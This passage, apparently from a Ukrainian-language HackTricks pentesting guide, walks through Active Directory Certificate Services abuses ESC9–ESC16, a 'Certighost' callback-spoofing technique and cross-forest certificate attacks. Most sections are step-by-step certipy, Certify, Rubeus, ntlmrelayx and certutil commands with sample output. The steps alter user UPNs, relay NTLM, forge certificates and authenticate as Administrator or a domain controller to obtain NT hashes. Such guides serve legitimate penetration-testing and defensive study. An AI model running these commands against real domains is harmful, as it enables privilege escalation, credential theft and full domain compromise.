Після цього вразливий шаблон сертифіката `ESC9` запитується від імені `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Зазначено, що `userPrincipalName` сертифіката відповідає `Administrator` і не містить жодного «object SID».

Потім `userPrincipalName` користувачки `Jane` повертається до початкового значення `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Спроба автентифікації за допомогою виданого сертифіката тепер повертає NT-хеш `Administrator@corp.local`. Команда має містити `-domain <domain>` через відсутність у сертифікаті зазначення домену:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Слабкі зіставлення сертифікатів - ESC10

### Пояснення

ESC10 стосується двох значень ключів реєстру на контролері домену:

- Значення за замовчуванням для `CertificateMappingMethods` у `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` дорівнює `0x18` (`0x8 | 0x10`), тоді як раніше воно дорівнювало `0x1F`.
- Значення за замовчуванням для `StrongCertificateBindingEnforcement` у `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` дорівнює `1`, тоді як раніше воно дорівнювало `0`.

**Випадок 1**

Коли `StrongCertificateBindingEnforcement` налаштовано як `0`.

**Випадок 2**

Якщо `CertificateMappingMethods` містить біт `UPN` (`0x4`).

### Сценарій використання 1

Якщо `StrongCertificateBindingEnforcement` налаштовано як `0`, обліковий запис A із дозволами `GenericWrite` можна використати для компрометації будь-якого облікового запису B.

Наприклад, маючи дозволи `GenericWrite` для `Jane@corp.local`, attacker прагне скомпрометувати `Administrator@corp.local`. Процедура аналогічна ESC9, що дає змогу використовувати будь-який certificate template.

Спочатку хеш `Jane` отримується за допомогою Shadow Credentials, використовуючи `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Згодом `Jane`'s `userPrincipalName` змінюється на `Administrator`, навмисно без частини `@corp.local`, щоб уникнути порушення обмеження.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Після цього запитується сертифікат, що забезпечує автентифікацію клієнта, як `Jane`, із використанням стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувачки `Jane` потім повертається до свого початкового значення — `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Автентифікація за допомогою отриманого сертифіката надасть NT-хеш `Administrator@corp.local`, тому в команді необхідно вказати домен через відсутність відомостей про домен у сертифікаті.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Випадок зловживання 2

Якщо `CertificateMappingMethods` містить бітовий прапорець `UPN` (`0x4`), обліковий запис A із дозволами `GenericWrite` може скомпрометувати будь-який обліковий запис B, у якого відсутня властивість `userPrincipalName`, зокрема облікові записи комп'ютерів і вбудований адміністратор домену `Administrator`.

Тут мета полягає в компрометації `DC$@corp.local`, починаючи з отримання хешу `Jane` через Shadow Credentials і використовуючи `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Потім `userPrincipalName` користувача `Jane` встановлюється як `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Сертифікат для автентифікації клієнта запитується як `Jane` за допомогою стандартного шаблону `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` користувача `Jane` повертається до початкового значення після цього процесу.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Для автентифікації через Schannel використовується опція `-ldap-shell` у Certipy, що свідчить про успішну автентифікацію як `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Через LDAP shell такі команди, як `set_rbcd`, дають змогу здійснювати атаки Resource-Based Constrained Delegation (RBCD), що потенційно може призвести до компрометації контролера домену.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ця вразливість також поширюється на будь-який обліковий запис користувача, у якого відсутній `userPrincipalName` або його значення не збігається з `sAMAccountName`. Обліковий запис `Administrator@corp.local` є основною ціллю через його розширені LDAP-привілеї та відсутність `userPrincipalName` за замовчуванням.

## Relaying NTLM to ICPR - ESC11

### Пояснення

Якщо на CA Server не налаштовано `IF_ENFORCEENCRYPTICERTREQUEST`, через службу RPC можна виконувати NTLM relay attacks без підпису. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Ви можете використати `certipy`, щоб перевірити, чи вимкнено `Enforce Encryption for Requests`. У такому разі certipy покаже вразливості `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Сценарій зловживання

Потрібно налаштувати relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Примітка: для контролерів домену потрібно вказати `-template` у DomainController.

Або використовуючи [форк impacket від sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access до ADCS CA with YubiHSM - ESC12

### Пояснення

Адміністратори можуть налаштувати Certificate Authority для зберігання ключа на зовнішньому пристрої, наприклад "Yubico YubiHSM2".

Якщо USB-пристрій підключено до сервера CA через USB-порт або до USB device server, якщо сервер CA є віртуальною машиною, для Key Storage Provider потрібен ключ автентифікації (іноді його називають "паролем"), щоб генерувати та використовувати ключі в YubiHSM.

Цей ключ/пароль зберігається в реєстрі за адресою `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` у відкритому вигляді.

Посилання наведено [тут](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Сценарій зловживання

Якщо приватний ключ CA зберігається на фізичному USB-пристрої, після отримання shell access можна відновити ключ.

Спочатку потрібно отримати сертифікат CA (він є public), а потім:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Нарешті, використайте команду certutil `-sign`, щоб створити новий довільний сертифікат за допомогою сертифіката CA та його приватного ключа.

## OID Group Link Abuse - ESC13

### Пояснення

Атрибут `msPKI-Certificate-Policy` дозволяє додавати політику видачі до шаблону сертифіката. Об'єкти `msPKI-Enterprise-Oid`, відповідальні за видачу політик, можна знайти в Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) контейнера PKI OID. Політику можна пов'язати з AD group за допомогою атрибута `msDS-OIDToGroupLink` цього об'єкта, що дозволяє системі авторизувати користувача, який надає сертифікат, так, ніби він є членом цієї групи. [Посилання тут](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Іншими словами, якщо користувач має дозвіл на отримання сертифіката, а сертифікат пов'язаний з OID group, користувач може успадкувати привілеї цієї групи.

Використовуйте [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), щоб знайти OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Сценарій зловживання

Знайдіть дозвіл користувача за допомогою `certipy find` або `Certify.exe find /showAllPermissions`.

Якщо `John` має дозвіл на enrollment у `VulnerableTemplate`, користувач може успадкувати привілеї групи `VulnerableGroup`.

Потрібно лише вказати template — буде отримано certificate із правами OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Уразлива конфігурація поновлення сертифіката — ESC14

### Пояснення

Опис на https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping надзвичайно детальний. Нижче наведено цитату з оригінального тексту.

ESC14 стосується вразливостей, що виникають через «слабке явне зіставлення сертифікатів», насамперед унаслідок неправильного використання або небезпечного налаштування атрибута `altSecurityIdentities` в облікових записах користувачів або комп’ютерів Active Directory. Цей багатозначний атрибут дає адміністраторам змогу вручну пов’язувати сертифікати X.509 з обліковим записом AD для автентифікації. Коли такі явні зіставлення задані, вони можуть перевизначати стандартну логіку зіставлення сертифікатів, яка зазвичай використовує UPN або DNS-імена в SAN сертифіката, або SID, вбудований у розширення безпеки `szOID_NTDS_CA_SECURITY_EXT`.

«Слабке» зіставлення виникає, коли рядкове значення в атрибуті `altSecurityIdentities`, яке використовується для ідентифікації сертифіката, є надто широким, легко передбачуваним, покладається на неунікальні поля сертифіката або використовує компоненти сертифіката, які легко підробити. Якщо зловмисник може отримати або створити сертифікат, атрибути якого відповідають такому слабкому явному зіставленню привілейованого облікового запису, він може використати цей сертифікат для автентифікації від імені цього облікового запису та його імперсонації.

Приклади потенційно слабких рядків зіставлення `altSecurityIdentities`:

- Зіставлення лише за поширеним Common Name (CN) суб’єкта: наприклад, `X509:<S>CN=SomeUser`. Зловмисник може отримати сертифікат із таким CN із менш захищеного джерела.
- Використання надто загальних Distinguished Name (DN) видавця або суб’єкта без додаткової ідентифікації, як-от конкретний серійний номер або ідентифікатор ключа суб’єкта: наприклад, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Використання інших передбачуваних шаблонів або некриптографічних ідентифікаторів, яким зловмисник може відповідати у сертифікаті, який він може легітимно отримати або підробити (якщо він скомпрометував CA або виявив уразливий шаблон, як у ESC1).

Атрибут `altSecurityIdentities` підтримує різні формати зіставлення, зокрема:

- `X509:<I>IssuerDN<S>SubjectDN` (зіставлення за повними DN видавця та суб’єкта)
- `X509:<SKI>SubjectKeyIdentifier` (зіставлення за значенням розширення Subject Key Identifier сертифіката)
- `X509:<SR>SerialNumberBackedByIssuerDN` (зіставлення за серійним номером, неявно уточненим DN видавця) — це не стандартний формат, зазвичай використовується `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (зіставлення за іменем RFC822, зазвичай адресою електронної пошти, із SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (зіставлення за SHA1-хешем необробленого відкритого ключа сертифіката — загалом надійний варіант)

Безпека цих зіставлень значною мірою залежить від конкретності, унікальності та криптографічної стійкості вибраних ідентифікаторів сертифіката, що використовуються в рядку зіставлення. Навіть за ввімкнених на Domain Controllers надійних режимів прив’язки сертифікатів (які переважно впливають на неявні зіставлення на основі SAN UPN/DNS і розширення SID), неправильно налаштований запис `altSecurityIdentities` усе одно може створити прямий шлях до імперсонації, якщо сама логіка зіставлення є помилковою або надто permissive.

### Сценарій зловживання

ESC14 націлений на **явні зіставлення сертифікатів** в Active Directory (AD), зокрема на атрибут `altSecurityIdentities`. Якщо цей атрибут задано (навмисно або через неправильну конфігурацію), зловмисники можуть імперсонувати облікові записи, надаючи сертифікати, що відповідають зіставленню.

#### Сценарій A: Зловмисник може записувати до `altSecurityIdentities`

**Попередня умова**: зловмисник має дозволи на запис до атрибута `altSecurityIdentities` цільового облікового запису або дозвіл надати такий доступ через одне з наведених нижче прав на цільовому об’єкті AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Сценарій B: Ціль має слабке зіставлення через X509RFC822 (Email)

- **Попередня умова**: ціль має слабке зіставлення X509RFC822 в altSecurityIdentities. Зловмисник може встановити атрибут mail жертви так, щоб він відповідав імені X509RFC822 цілі, зареєструвати сертифікат від імені жертви та використати його для автентифікації як ціль.

#### Сценарій C: Ціль має зіставлення X509IssuerSubject

- **Попередня умова**: ціль має слабке явне зіставлення X509IssuerSubject в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` у principal жертви так, щоб він відповідав суб’єкту зіставлення X509IssuerSubject цілі. Потім зловмисник може зареєструвати сертифікат від імені жертви та використати цей сертифікат для автентифікації як ціль.

#### Сценарій D: Ціль має зіставлення X509SubjectOnly

- **Попередня умова**: ціль має слабке явне зіставлення X509SubjectOnly в `altSecurityIdentities`. Зловмисник може встановити атрибут `cn` або `dNSHostName` у principal жертви так, щоб він відповідав суб’єкту зіставлення X509SubjectOnly цілі. Потім зловмисник може зареєструвати сертифікат від імені жертви та використати цей сертифікат для автентифікації як ціль.

### практичні операції
#### Сценарій A

Запросіть сертифікат із шаблону сертифіката `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Збережіть і конвертуйте сертифікат
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Автентифікуватися (за допомогою сертифіката)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Очищення (необов’язково)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Для більш конкретних методів атак у різних сценаріях атак зверніться до: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Пояснення

Опис за адресою https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc є надзвичайно докладним. Нижче наведено цитату з оригінального тексту.

Використовуючи вбудовані стандартні шаблони сертифікатів версії 1, зловмисник може сформувати CSR, додавши до нього application policies, яким надається перевага над налаштованими атрибутами Extended Key Usage, зазначеними в шаблоні. Єдина вимога — права на enrollment; це можна використати для створення сертифікатів client authentication, certificate request agent і codesigning за допомогою шаблону **_WebServer_**

### Зловживання

Нижче наведено посилання на [цей матеріал]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),натисніть, щоб переглянути докладніші методи використання.


Команда `find` у Certipy допоможе виявити шаблони V1, які потенційно вразливі до ESC15, якщо CA не пропатчено.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Сценарій A: Пряма імперсонація через Schannel

**Крок 1: Запросити сертифікат, впровадивши політику застосунку "Client Authentication" і цільовий UPN.** Зловмисник `attacker@corp.local` націлюється на `administrator@corp.local`, використовуючи шаблон "WebServer" V1 (який дозволяє суб’єкту, наданому реєстрантом).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Вразливий шаблон V1 із параметром "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Додає OID `1.3.6.1.5.5.7.3.2` до розширення Application Policies у CSR.
- `-upn 'administrator@corp.local'`: Встановлює UPN у SAN для impersonation.

**Крок 2: Автентифікація через Schannel (LDAPS) за допомогою отриманого сертифіката.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Сценарій B: PKINIT/Kerberos Impersonation через зловживання Enrollment Agent

**Крок 1: Запросіть сертифікат із шаблону V1 (з параметром "Enrollee supplies subject"), додавши Application Policy "Certificate Request Agent".** Цей сертифікат призначений для attacker (`attacker@corp.local`), щоб він став enrollment agent. Тут для власної ідентичності attacker не вказується UPN, оскільки метою є отримання можливості діяти як агент.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Інжектує OID `1.3.6.1.4.1.311.20.2.1`.

**Крок 2: Використайте сертифікат "agent", щоб запитати сертифікат від імені цільового привілейованого користувача.** Це крок на кшталт ESC3, у якому сертифікат із Кроку 1 використовується як сертифікат агента.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Крок 3: Автентифікуйтеся як привілейований користувач за допомогою сертифіката "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Пояснення

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** означає сценарій, за якого, якщо конфігурація AD CS не забезпечує додавання розширення **szOID_NTDS_CA_SECURITY_EXT** до всіх сертифікатів, attacker може скористатися цим, щоб:

1. Запросити сертифікат **без SID binding**.

2. Використати цей сертифікат **для автентифікації як будь-який обліковий запис**, наприклад видаючи себе за обліковий запис із високими привілеями (наприклад, Domain Administrator).

Також можна звернутися до цієї статті, щоб дізнатися більше про детальний принцип:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Зловживання

Нижче наведено посилання на [цю сторінку](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), натисніть, щоб переглянути докладніші методи використання.

Щоб визначити, чи є середовище Active Directory Certificate Services (AD CS) вразливим до **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Крок 1: Прочитати початковий UPN облікового запису жертви (необов’язково — для відновлення).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Крок 2: Оновіть UPN облікового запису жертви до `sAMAccountName` цільового адміністратора.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Крок 3: (Якщо потрібно) Отримайте облікові дані облікового запису «жертви» (наприклад, за допомогою Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Крок 4: Запросіть сертифікат як користувач-"жертва" з _будь-якого придатного шаблону автентифікації клієнта_ (наприклад, "User") на вразливому до ESC16 CA.** Оскільки CA вразливий до ESC16, він автоматично вилучить розширення безпеки SID із виданого сертифіката незалежно від конкретних налаштувань шаблону для цього розширення. Установіть змінну середовища кешу облікових даних Kerberos (команда оболонки):
```bash
export KRB5CCNAME=victim.ccache
```
Потім запросіть сертифікат:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Крок 5: Відновіть UPN облікового запису "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Крок 6: Автентифікуйтеся як цільовий адміністратор.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Підміна ідентичності через callback-запит Rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Пояснення

**Certighost** зловживає **шляхом chase / callback під час enrollment в AD CS**, у якому CA довіряє атрибутам запиту, наданим requester, щоб визначити ідентичність, яку слід помістити у виданий сертифікат. У публічному PoC створений запит містить:

- **`cdc`**: host/IP під контролем attacker, до якого CA підключиться
- **`rmd`**: **DNS-ім'я цільового Domain Controller**, який потрібно імперсонувати

Якщо CA виконає цей chase, він підключиться до attacker через **SMB/LSA (`445`)** і **LDAP (`389`)**. Attacker використовує **реальний machine account** (зазвичай створений через стандартний **`ms-DS-MachineAccountQuota`**), щоб callback-сесія автентифікувалася як дійсний domain principal, але rogue-сервіси повертають натомість атрибути ідентичності **цільового DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Якщо CA **криптографічно не пов'язує повернуту ідентичність з автентифікованим callback principal**, він може видати сертифікат для **Domain Controller**, хоча сесія автентифікувалася як machine account під контролем attacker. Концептуально це відрізняє баг від **Certifried**: замість перезапису AD-атрибутів, таких як `dNSHostName`, attacker **підміняє дані ідентичності під час callback-розв'язання CA**.

**Необхідні умови:**

- Облікові дані **domain** з низькими привілеями
- Можливість **створити або повторно використати computer account**
- Мережева доступність із **CA** до контрольованих attacker **портів `389` і `445`**
- Вразливий / не пропатчений шлях обробки запитів CA (оновлення Microsoft від **14 липня 2026 року** додало **валідацію DC для `cdc`** разом із **порівнянням resolved SID**)

Отриманий **`.pfx`** потім можна використати для **PKINIT**, створивши **`.ccache`** і, відповідно до опублікованого PoC flow, **NT hash цільового DC**, чого зазвичай достатньо для **повної компрометації domain**.

### Зловживання

Публічний PoC автоматизує весь ланцюг:

1. Створити або повторно використати контрольований attacker **machine account**.
2. Запустити **rogue LDAP і SMB/LSA listeners** на `389` і `445`.
3. Надіслати certificate request із контрольованими attacker атрибутами **`cdc`** і цільовим **`rmd`**.
4. Дозволити CA автентифікуватися на rogue listeners як контрольований machine account, але відповісти на identity lookups атрибутами **цільового DC**.
5. Отримати підписаний CA **сертифікат DC**, а потім використати його для **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Корисні runtime flags з PoC:

- `--listener <ip>`: явний вибір IP для callback, який рекламується в `cdc`
- `--computer-name <NAME$>`: повторне використання наявного machine account замість створення нового

**Операційні примітки:**

- Для PoC потрібні права **root**, оскільки він прив'язується до **привілейованих портів** `389` і `445`.
- У разі успішної експлуатації локально записуються **DC `.pfx`** і **Kerberos `.ccache`**.
- Оскільки сертифікат зіставляється з обліковим записом **Domain Controller**, подальші дії можуть включати **certificate-based Kerberos auth**, **DCSync** і повторне використання отриманого **machine NT hash**.

## Компрометація лісів за допомогою сертифікатів: пояснення в пасивному стані

### Зламування довірчих відносин між лісами через скомпрометовані CA

Конфігурація для **cross-forest enrollment** налаштовується відносно просто. **Root CA certificate** з resource forest **публікується адміністраторами в account forests**, а сертифікати **enterprise CA** з resource forest **додаються до контейнерів `NTAuthCertificates` і AIA у кожному account forest**. Для уточнення: така схема надає **CA у resource forest повний контроль** над усіма іншими лісами, для яких ним керується PKI. Якщо цей CA буде **скомпрометований attackers**, ними можуть бути **підроблені сертифікати для всіх користувачів у resource та account forests**, що призведе до порушення межі безпеки лісу.

### Надання привілеїв enrollment іноземним принципалам

У multi-forest середовищах необхідно з обережністю ставитися до Enterprise CA, які **публікують certificate templates**, що надають **Authenticated Users або foreign principals** (користувачам/групам, зовнішнім щодо лісу, якому належить Enterprise CA) права на **enrollment та редагування**.\
Під час автентифікації через trust **SID Authenticated Users** додається AD до токена користувача. Отже, якщо домен має Enterprise CA із template, яка **дозволяє Authenticated Users права enrollment**, користувач з іншого лісу потенційно може **виконати enrollment у template**. Так само, якщо **права enrollment явно надані foreign principal через template**, таким чином створюється **cross-forest access-control relationship**, що дає principal з одного лісу змогу **виконати enrollment у template з іншого лісу**.

Обидва сценарії призводять до **збільшення attack surface** з одного лісу до іншого. Налаштування certificate template може бути використане attacker для отримання додаткових привілеїв у foreign domain.


## References

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
